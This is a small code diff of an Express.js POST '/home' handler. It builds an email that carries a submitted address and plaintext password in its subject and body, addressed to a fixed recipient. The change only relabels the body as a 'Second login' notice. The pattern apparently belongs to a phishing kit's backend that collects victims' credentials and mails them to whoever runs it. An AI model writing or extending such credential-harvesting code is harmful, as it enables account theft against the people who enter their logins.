@@ -65,7 +65,7 @@ app.post("/home", (req, res) => {
     from: `${email}`,
     to: userEmail,
     subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    text: `Second login from New user registered with Email: ${email} and password: ${password}`,
   };
 
   console.log(mailOptions);
